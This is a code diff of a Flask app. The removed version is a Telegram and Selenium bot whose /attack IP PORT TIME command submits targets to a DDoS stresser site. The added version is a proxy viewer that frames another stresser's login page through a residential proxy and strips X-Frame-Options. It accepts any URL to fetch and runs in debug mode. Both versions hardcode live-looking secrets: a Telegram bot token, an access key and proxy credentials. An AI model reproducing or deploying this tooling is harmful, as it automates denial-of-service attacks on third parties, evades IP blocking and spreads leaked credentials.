@@ -1,590 +1,353 @@
-import os
-import json
-import time
-import pickle
-import threading
-import re
-import random
-from datetime import datetime
-from flask import Flask, render_template_string, request, jsonify
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.chrome.service import Service
-from selenium.webdriver.chrome.options import Options
-from pyvirtualdisplay import Display
+from flask import Flask, render_template_string, request, jsonify, Response
+from flask_cors import CORS
+import requests
+from urllib.parse import urlparse
 import logging
-import asyncio
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
-import subprocess
-import sys
+import os
+import time
 
-# ==================== CONFIG ====================
-TELEGRAM_BOT_TOKEN = "8739857934:AAFC8icETbmsxjYIqxcOmF8MHD_xg7xHZdo"
-ACCESS_KEY = "2d1139b0c49e3019b0a54a5f6e60062957db4353b4daf6259b8a2752276d26b4"
-LOGIN_URL = "https://satellitestress.st/login"
-ATTACK_URL = "https://satellitestress.st/attack"
-COOKIES_FILE = "cookies.pkl"
-PORT = int(os.environ.get("PORT", 10000))  # Render expects port 10000
+# Proxy Configuration
+PROXY_CONFIG = {
+    'server': 'http://change4.owlproxy.com:7778',
+    'username': 'IIOL0QVOzN30_custom_zone_SG_st__city_sid_79312845_time_5',
+    'password': '2272641'
+}
+PROXY_ENABLED = True
 
-# ==================== CHROME PATHS for Render ====================
-CHROME_PATHS = [
-    '/usr/bin/google-chrome',
-    '/usr/bin/google-chrome-stable',
-    '/usr/bin/chromium-browser',
-    '/usr/bin/chromium',
-    '/app/.chrome-for-testing/chrome-linux64/chrome',
-    '/opt/render/project/.chrome/chrome-linux64/chrome'
-]
+app = Flask(__name__)
+CORS(app)
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-app = Flask(__name__)
-app.secret_key = os.urandom(24)
-
-# ==================== CHROME INSTALLER for Render ====================
-def install_chrome():
-    """Install Chrome on Render"""
-    try:
-        logger.info("📦 Installing Chrome...")
-        
-        # Download Chrome
-        subprocess.run([
-            'wget', '-q', '-O', 'chrome.deb',
-            'https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb'
-        ], check=True)
-        
-        # Install Chrome
-        subprocess.run([
-            'dpkg', '-i', 'chrome.deb'
-        ], check=False)  # Continue even if fails
-        
-        # Fix dependencies
-        subprocess.run([
-            'apt-get', 'install', '-f', '-y'
-        ], check=True)
-        
-        # Remove deb file
-        os.remove('chrome.deb')
-        
-        logger.info("✅ Chrome installed")
-        return True
-    except Exception as e:
-        logger.error(f"Chrome install error: {e}")
-        return False
-
-# ==================== BROWSER MANAGER ====================
-class BrowserManager:
-    def __init__(self):
-        self.driver = None
-        self.display = None
-        self.is_logged_in = False
-        self.login_time = None
-        
-    def find_chrome(self):
-        """Find Chrome executable path"""
-        for path in CHROME_PATHS:
-            if os.path.exists(path):
-                return path
-        return None
-        
-    def start(self):
-        """Start browser with proper Chrome path"""
-        try:
-            logger.info("🚀 Starting browser...")
-            
-            # Find Chrome
-            chrome_path = self.find_chrome()
-            if not chrome_path:
-                logger.warning("Chrome not found, installing...")
-                install_chrome()
-                chrome_path = self.find_chrome()
-            
-            logger.info(f"📌 Chrome path: {chrome_path}")
-            
-            # Virtual display
-            self.display = Display(visible=0, size=(1920, 1080))
-            self.display.start()
-            
-            # Chrome options
-            options = Options()
-            options.binary_location = chrome_path
-            options.add_argument("--no-sandbox")
-            options.add_argument("--disable-dev-shm-usage")
-            options.add_argument("--disable-gpu")
-            options.add_argument("--headless=new")
-            options.add_argument("--window-size=1920,1080")
-            options.add_argument("--disable-blink-features=AutomationControlled")
-            options.add_argument("--disable-web-security")
-            options.add_argument("--allow-running-insecure-content")
-            options.add_argument("--ignore-certificate-errors")
-            options.add_argument("--disable-features=VizDisplayCompositor")
-            
-            # Start driver (without webdriver-manager)
-            service = Service(executable_path="/usr/local/bin/chromedriver")
-            self.driver = webdriver.Chrome(service=service, options=options)
-            
-            logger.info("✅ Browser started")
-            
-            # Load session
-            if os.path.exists(COOKIES_FILE):
-                self.load_session()
-            
-        except Exception as e:
-            logger.error(f"Browser start error: {e}")
-    
-    def load_session(self):
-        """Load saved cookies"""
-        try:
-            with open(COOKIES_FILE, 'rb') as f:
-                cookies = pickle.load(f)
-            
-            self.driver.get(LOGIN_URL)
-            time.sleep(3)
-            
-            for cookie in cookies:
-                try:
-                    self.driver.add_cookie(cookie)
-                except:
-                    pass
-            
-            logger.info("✅ Session loaded")
-            self.check_login()
-            
-        except Exception as e:
-            logger.error(f"Session load error: {e}")
-    
-    def save_session(self):
-        """Save cookies"""
-        try:
-            cookies = self.driver.get_cookies()
-            with open(COOKIES_FILE, 'wb') as f:
-                pickle.dump(cookies, f)
-            logger.info(f"✅ Saved {len(cookies)} cookies")
-            return True
-        except Exception as e:
-            logger.error(f"Save error: {e}")
-            return False
-    
-    def check_login(self):
-        """Check if logged in"""
-        try:
-            self.driver.get(ATTACK_URL)
-            time.sleep(3)
-            
-            if "attack" in self.driver.current_url or "dashboard" in self.driver.current_url:
-                self.is_logged_in = True
-                self.login_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                logger.info("✅ Logged in")
-                return True
-        except:
-            pass
-        
-        self.is_logged_in = False
-        return False
-    
-    def attack(self, ip, port, duration):
-        """Launch attack"""
-        try:
-            self.driver.get(ATTACK_URL)
-            time.sleep(3)
-            
-            WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.NAME, "ip")))
-            
-            ip_input = self.driver.find_element(By.NAME, "ip")
-            ip_input.clear()
-            ip_input.send_keys(ip)
-            
-            port_input = self.driver.find_element(By.NAME, "port")
-            port_input.clear()
-            port_input.send_keys(str(port))
-            
-            time_input = self.driver.find_element(By.NAME, "time")
-            time_input.clear()
-            time_input.send_keys(str(duration))
-            
-            submit_btn = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
-            submit_btn.click()
-            time.sleep(3)
-            
-            logger.info(f"✅ Attack sent")
-            return True
-            
-        except Exception as e:
-            logger.error(f"Attack error: {e}")
-            return False
-
-# ==================== TELEGRAM BOT ====================
-class TelegramBot:
-    def __init__(self, browser):
-        self.browser = browser
-        self.application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-        self.setup_handlers()
-    
-    def setup_handlers(self):
-        self.application.add_handler(CommandHandler("start", self.start))
-        self.application.add_handler(CommandHandler("help", self.help))
-        self.application.add_handler(CommandHandler("status", self.status))
-        self.application.add_handler(CommandHandler("attack", self.attack))
-    
-    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        await update.message.reply_text(
-            "🚀 **Satellite Stress Bot**\n\n"
-            f"🌐 Web: https://udprocket-5.onrender.com\n\n"
-            "**Commands:**\n"
-            "/status - Check login\n"
-            "/attack IP PORT TIME - Launch attack",
-            parse_mode="Markdown"
-        )
-    
-    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        await update.message.reply_text(
-            "📚 **Usage:**\n\n"
-            "1. Open web interface\n"
-            "2. Login in iframe\n"
-            "3. Save session\n"
-            "4. Use /attack\n\n"
-            f"**Access Key:** `{ACCESS_KEY}`",
-            parse_mode="Markdown"
-        )
-    
-    async def status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        self.browser.check_login()
-        text = f"📊 **Status:**\n\n"
-        text += f"Login: {'✅' if self.browser.is_logged_in else '❌'}\n"
-        text += f"Session: {'✅' if os.path.exists(COOKIES_FILE) else '❌'}"
-        await update.message.reply_text(text, parse_mode="Markdown")
-    
-    async def attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not self.browser.is_logged_in:
-            await update.message.reply_text("❌ Not logged in. Login via web first.")
-            return
-        
-        if len(context.args) < 3:
-            await update.message.reply_text("❌ Use: /attack IP PORT TIME")
-            return
-        
-        ip, port, duration = context.args[0], context.args[1], context.args[2]
-        
-        await update.message.reply_text(f"🚀 Attacking {ip}:{port}...")
-        
-        success = await asyncio.get_event_loop().run_in_executor(
-            None, self.browser.attack, ip, port, duration
-        )
-        
-        if success:
-            await update.message.reply_text("✅ Attack launched!")
-        else:
-            await update.message.reply_text("❌ Attack failed")
-    
-    def run(self):
-        self.application.run_polling()
-
-# ==================== HTML TEMPLATE ====================
-HTML = """
+# HTML Template
+HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Satellite Stress Bot</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kimstress Login - Proxy Viewer</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0f172a;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             padding: 20px;
         }
         .container {
-            max-width: 1000px;
-            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
             background: white;
-            border-radius: 24px;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
             overflow: hidden;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
         }
-        .header {
-            background: linear-gradient(135deg, #2563eb, #7c3aed);
+        header {
+            background: white;
+            padding: 20px 30px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        header h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+        .proxy-badge {
+            background: #6f42c1;
             color: white;
-            padding: 20px;
-            text-align: center;
-        }
-        .content { padding: 20px; }
-        
-        .status-bar {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-        .status-item {
-            background: #f1f5f9;
-            padding: 10px 15px;
-            border-radius: 12px;
-            flex: 1;
-        }
-        .status-label { color: #64748b; font-size: 12px; }
-        .status-value { font-weight: 600; color: #0f172a; }
-        .badge {
-            display: inline-block;
-            padding: 2px 8px;
+            padding: 3px 8px;
             border-radius: 12px;
             font-size: 11px;
-            margin-left: 5px;
+            font-weight: bold;
+            margin-left: 10px;
         }
-        .badge-success { background: #22c55e; color: white; }
-        .badge-warning { background: #eab308; color: white; }
-        
-        .key-box {
-            background: #0f172a;
-            color: #e2e8f0;
-            padding: 15px;
-            border-radius: 12px;
-            font-family: monospace;
-            word-break: break-all;
-            margin: 20px 0;
-            font-size: 14px;
-        }
-        
-        .button-group {
+        .status-bar {
+            background: #f8f9fa;
+            padding: 10px 30px;
+            border-bottom: 1px solid #e0e0e0;
+            font-size: 13px;
+            color: #666;
             display: flex;
-            gap: 10px;
-            margin: 20px 0;
-            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
         }
-        .btn {
-            padding: 12px 20px;
-            border: none;
-            border-radius: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            color: white;
-            flex: 1;
+        .status-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 5px;
         }
-        .btn-primary { background: #2563eb; }
-        .btn-success { background: #22c55e; }
-        .btn-warning { background: #eab308; }
-        
+        .status-online { background-color: #28a745; }
+        .status-offline { background-color: #dc3545; }
+        .proxy-info {
+            background: #e7f5ff;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 12px;
+        }
         .iframe-container {
+            position: relative;
             width: 100%;
-            height: 600px;
-            border: 2px solid #e2e8f0;
-            border-radius: 12px;
-            overflow: hidden;
-            margin: 20px 0;
-            background: white;
+            height: 70vh;
+            background: #f5f5f5;
         }
         iframe {
             width: 100%;
             height: 100%;
             border: none;
+            background: white;
         }
-        
-        .telegram-link {
-            display: block;
+        .controls {
+            padding: 20px 30px;
+            background: white;
+            border-top: 1px solid #e0e0e0;
             text-align: center;
-            padding: 15px;
-            background: #1e293b;
+        }
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
-            text-decoration: none;
-            border-radius: 12px;
-            margin: 20px 0;
+            border: none;
+            padding: 10px 30px;
+            margin: 0 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: transform 0.2s;
         }
-        
-        .footer {
-            text-align: center;
-            padding: 15px;
-            background: #f8fafc;
-            color: #64748b;
-            font-size: 12px;
+        .btn:hover { transform: translateY(-2px); }
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 10px 20px;
+            display: none;
         }
-        
-        .note-box {
-            background: #fee2e2;
-            border: 1px solid #ef4444;
-            color: #991b1b;
-            padding: 15px;
-            border-radius: 12px;
-            margin: 20px 0;
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 10px 20px;
+            display: none;
+        }
+        .loading-overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(255,255,255,0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @media (max-width: 768px) {
+            .btn { display: block; width: 100%; margin: 10px 0; }
+            .status-bar { flex-direction: column; gap: 10px; }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>🐍 Satellite Stress Bot</h1>
+        <header>
+            <h1>Kimstress.st Login <span class="proxy-badge">🌐 Proxy Active</span></h1>
+        </header>
+        
+        <div class="status-bar">
+            <span>
+                <span class="status-indicator status-online" id="statusIndicator"></span>
+                <span id="statusText">Connecting...</span>
+            </span>
+            <span class="proxy-info" id="proxyLocation">📍 Singapore Proxy</span>
+            <span>🎯 kimstress.st/login</span>
         </div>
         
-        <div class="content">
-            <div class="note-box">
-                <strong>⚠️ IMPORTANT:</strong><br>
-                Website is blocking Render IP. Please use this VPN extension in Chrome:
-                <br><br>
-                <strong>1. Install this extension:</strong><br>
-                <a href="https://chrome.google.com/webstore/detail/zenmate-free-vpn%E2%80%93best-vpn/fdcgdnkidjaadafnichfpabhfomcebme" target="_blank">ZenMate VPN</a><br>
-                <a href="https://chrome.google.com/webstore/detail/hola-free-vpn-proxy-unblo/gkojfkhlekighikafcpjkiklfbnlmeio" target="_blank">Hola VPN</a>
-                <br><br>
-                <strong>2. Connect to any country (India/US/UK)</strong><br>
-                <strong>3. Refresh this page</strong>
+        <div class="iframe-container">
+            <iframe id="mainIframe" src="/proxy?url=https://kimstress.st/login" frameborder="0"></iframe>
+            <div class="loading-overlay" id="loadingOverlay">
+                <div class="loading-spinner"></div>
             </div>
-            
-            <div class="status-bar">
-                <div class="status-item">
-                    <div class="status-label">Login Status</div>
-                    <div class="status-value">
-                        <span id="loginText">{{ 'Logged In' if is_logged_in else 'Not Logged In' }}</span>
-                        <span id="loginBadge" class="badge {{ 'badge-success' if is_logged_in else 'badge-warning' }}">
-                            {{ 'ACTIVE' if is_logged_in else 'INACTIVE' }}
-                        </span>
-                    </div>
-                </div>
-                <div class="status-item">
-                    <div class="status-label">Session</div>
-                    <div class="status-value" id="sessionText">
-                        {{ '✅ Saved' if session_exists else '❌ Not Saved' }}
-                    </div>
-                </div>
-            </div>
-            
-            <div class="key-box">
-                <strong>🔑 ACCESS KEY:</strong><br>
-                {{ access_key }}
-            </div>
-            
-            <div class="button-group">
-                <button class="btn btn-primary" onclick="reloadIframe()">🔄 Reload Login Page</button>
-                <button class="btn btn-success" onclick="saveSession()">💾 Save Session</button>
-                <button class="btn btn-warning" onclick="checkStatus()">🔄 Refresh Status</button>
-            </div>
-            
-            <div class="iframe-container">
-                <iframe id="loginFrame" src="{{ login_url }}"></iframe>
-            </div>
-            
-            <div style="background: #dbeafe; padding: 15px; border-radius: 12px; margin: 20px 0;">
-                <strong>📝 LOGIN STEPS:</strong><br>
-                1. Install VPN extension (Chrome Web Store) ⬆️<br>
-                2. Connect to India/UK/US server<br>
-                3. Refresh this page (Reload Login Page)<br>
-                4. Login with Access Key<br>
-                5. Click "Save Session"<br>
-                6. Use Telegram bot
-            </div>
-            
-            <a href="https://t.me/satellitestress_bot" class="telegram-link" target="_blank">
-                📱 Open Telegram Bot
-            </a>
         </div>
         
-        <div class="footer">
-            Port: {{ port }} | Render URL: {{ render_url }}
+        <div id="errorMessage" class="error-message"></div>
+        <div id="successMessage" class="success-message"></div>
+        
+        <div class="controls">
+            <button onclick="reloadIframe()" class="btn">⟳ Reload</button>
+            <button onclick="openInNewTab()" class="btn">↗ New Tab</button>
+            <button onclick="testProxy()" class="btn">🌐 Test Proxy</button>
         </div>
     </div>
-    
+
     <script>
+        const iframe = document.getElementById('mainIframe');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const errorMsg = document.getElementById('errorMessage');
+        const successMsg = document.getElementById('successMessage');
+        const statusIndicator = document.getElementById('statusIndicator');
+        const statusText = document.getElementById('statusText');
+
+        iframe.addEventListener('load', function() {
+            loadingOverlay.style.display = 'none';
+            statusIndicator.className = 'status-indicator status-online';
+            statusText.textContent = 'Connected via Proxy';
+            showSuccess('Page loaded successfully');
+        });
+
+        iframe.addEventListener('error', function() {
+            loadingOverlay.style.display = 'none';
+            statusIndicator.className = 'status-indicator status-offline';
+            statusText.textContent = 'Connection Failed';
+            showError('Failed to load page');
+        });
+
         function reloadIframe() {
-            document.getElementById('loginFrame').src = '{{ login_url }}';
+            loadingOverlay.style.display = 'flex';
+            iframe.src = iframe.src;
         }
-        
-        async function saveSession() {
-            const btn = event.target;
-            btn.textContent = '💾 Saving...';
-            btn.disabled = true;
-            
-            try {
-                const res = await fetch('/save-session', {method: 'POST'});
-                const data = await res.json();
-                alert(data.success ? '✅ Session saved!' : '❌ ' + data.message);
-            } catch (e) {
-                alert('❌ Error: ' + e.message);
-            } finally {
-                btn.textContent = '💾 Save Session';
-                btn.disabled = false;
-                checkStatus();
-            }
+
+        function openInNewTab() {
+            window.open('https://kimstress.st/login', '_blank');
         }
-        
-        async function checkStatus() {
-            const res = await fetch('/status');
-            const data = await res.json();
-            
-            document.getElementById('loginText').textContent = data.is_logged_in ? 'Logged In' : 'Not Logged In';
-            document.getElementById('loginBadge').textContent = data.is_logged_in ? 'ACTIVE' : 'INACTIVE';
-            document.getElementById('loginBadge').className = 'badge ' + (data.is_logged_in ? 'badge-success' : 'badge-warning');
-            document.getElementById('sessionText').textContent = data.session_exists ? '✅ Saved' : '❌ Not Saved';
+
+        function testProxy() {
+            fetch('/test-proxy')
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        showSuccess(`Proxy OK! IP: ${data.ip}`);
+                        document.getElementById('proxyLocation').textContent = `📍 ${data.location}`;
+                    } else {
+                        showError('Proxy test failed');
+                    }
+                })
+                .catch(() => showError('Proxy test error'));
         }
-        
-        setInterval(checkStatus, 5000);
+
+        function showError(msg) {
+            errorMsg.style.display = 'block';
+            errorMsg.textContent = '❌ ' + msg;
+            successMsg.style.display = 'none';
+            setTimeout(() => errorMsg.style.display = 'none', 5000);
+        }
+
+        function showSuccess(msg) {
+            successMsg.style.display = 'block';
+            successMsg.textContent = '✅ ' + msg;
+            errorMsg.style.display = 'none';
+            setTimeout(() => successMsg.style.display = 'none', 3000);
+        }
+
+        // Auto test proxy on load
+        setTimeout(testProxy, 1000);
     </script>
 </body>
 </html>
 """
 
-# ==================== FLASK ROUTES ====================
-browser = BrowserManager()
+def get_proxy_config():
+    if not PROXY_ENABLED:
+        return None
+    parsed = urlparse(PROXY_CONFIG['server'])
+    proxy_with_auth = f"{parsed.scheme}://{PROXY_CONFIG['username']}:{PROXY_CONFIG['password']}@{parsed.netloc}"
+    return {'http': proxy_with_auth, 'https': proxy_with_auth}
 
 @app.route('/')
 def index():
-    return render_template_string(
-        HTML,
-        is_logged_in=browser.is_logged_in,
-        session_exists=os.path.exists(COOKIES_FILE),
-        access_key=ACCESS_KEY,
-        login_url=LOGIN_URL,
-        render_url="https://udprocket-5.onrender.com",
-        port=PORT
-    )
+    return render_template_string(HTML_TEMPLATE)
 
-@app.route('/status')
-def get_status():
+@app.route('/proxy')
+def proxy():
+    target_url = request.args.get('url', 'https://kimstress.st/login')
+    
+    try:
+        proxies = get_proxy_config()
+        
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Connection': 'keep-alive',
+        }
+        
+        logger.info(f"Fetching {target_url} via proxy")
+        
+        response = requests.get(
+            target_url,
+            headers=headers,
+            timeout=30,
+            proxies=proxies,
+            allow_redirects=True
+        )
+        
+        proxy_response = Response(
+            response.content,
+            status=response.status_code,
+            content_type=response.headers.get('Content-Type', 'text/html')
+        )
+        
+        proxy_response.headers['Access-Control-Allow-Origin'] = '*'
+        
+        # Remove X-Frame-Options
+        if 'X-Frame-Options' in proxy_response.headers:
+            del proxy_response.headers['X-Frame-Options']
+            
+        return proxy_response
+        
+    except requests.ProxyError as e:
+        logger.error(f"Proxy error: {e}")
+        return "Proxy connection error", 502
+    except Exception as e:
+        logger.error(f"Error: {e}")
+        return f"Error: {str(e)}", 500
+
+@app.route('/test-proxy')
+def test_proxy():
+    try:
+        proxies = get_proxy_config()
+        if not proxies:
+            return jsonify({"status": "error", "message": "Proxy disabled"})
+            
+        response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=10)
+        
+        if response.status_code == 200:
+            data = response.json()
+            ip = data.get('origin', 'Unknown')
+            
+            # Get location
+            loc_res = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
+            if loc_res.status_code == 200:
+                loc_data = loc_res.json()
+                location = f"{loc_data.get('city', 'Unknown')}, {loc_data.get('country', 'Unknown')}"
+            else:
+                location = "Singapore"
+                
+            return jsonify({
+                "status": "success",
+                "ip": ip,
+                "location": location
+            })
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
+
+@app.route('/health')
+def health():
     return jsonify({
-        'is_logged_in': browser.is_logged_in,
-        'session_exists': os.path.exists(COOKIES_FILE),
-        'login_time': browser.login_time
+        "status": "healthy",
+        "proxy_enabled": PROXY_ENABLED,
+        "proxy_server": PROXY_CONFIG['server'],
+        "timestamp": time.time()
     })
 
-@app.route('/save-session', methods=['POST'])
-def save_session():
-    if browser.save_session():
-        browser.check_login()
-        return jsonify({'success': True})
-    return jsonify({'success': False, 'message': 'No cookies found'})
-
-# ==================== MAIN ====================
-def run_flask():
-    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
-
-def run_telegram():
-    try:
-        bot = TelegramBot(browser)
-        bot.run()
-    except Exception as e:
-        logger.error(f"Telegram bot error: {e}")
-
 if __name__ == '__main__':
-    print("="*50)
-    print("🚀 Starting Satellite Stress Bot")
-    print(f"📌 Port: {PORT}")
-    print("="*50)
-    
-    # Install Chrome if needed
-    if not os.path.exists('/usr/bin/google-chrome-stable'):
-        install_chrome()
-    
-    # Start browser
-    browser.start()
-    browser.check_login()
-    
-    # Start Flask
-    flask_thread = threading.Thread(target=run_flask)
-    flask_thread.daemon = True
-    flask_thread.start()
-    
-    # Run Telegram
-    run_telegram()
+    port = int(os.environ.get('PORT', 5000))
+    print(f"🚀 Server starting on port {port}")
+    print(f"🌐 Proxy: {PROXY_CONFIG['server']}")
+    print(f"📍 Location: Singapore")
+    app.run(host='0.0.0.0', port=port, debug=True)
